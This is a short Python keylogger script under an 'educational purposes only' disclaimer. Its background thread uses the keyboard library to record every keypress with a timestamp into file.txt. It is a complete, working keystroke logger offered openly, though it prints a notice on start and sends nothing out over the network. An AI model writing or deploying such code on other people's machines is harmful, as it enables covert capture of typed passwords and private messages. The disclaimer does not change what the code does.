# THIS IS FOR EDUCATIONAL PURPOSES ONLY, AND NOT TO BE USED FOR MALICIOUS ACTIVITY.

import keyboard
import datetime
import os, threading

print("Key_logging session running...\nOpen file.txt to look at keys pressed...")
try:

    os.system("Del file.txt")

except FileNotFoundError:

    with open("file.txt", "w") as e:
        pass

finally:
    with open("file.txt", "w") as f:
        pass


def initiate_key_logging():

    event = keyboard.read_key()
    with open("file.txt", "a") as keys_pressed:
        keys_pressed.write(f"\n{str(datetime.datetime.now())}\n")
        keys_pressed.write("--------This key was pressed at the above time------")
        keys_pressed.write(f"\n{str(event)}\n")


run = True


def logging_check_loop(state):
    with open("file.txt", "a") as header:
        header.write("ALL KEYS ARE PRESSED ONCE IF THEY APPEAR TWICE, AND TWICE IF THEY APPEAR FOUR TIMES\n AND SO ON..\n")
    while state is True:
        initiate_key_logging()


thread1 = threading.Thread(target=lambda: logging_check_loop(run))

if __name__ == '__main__':
    thread1.start()
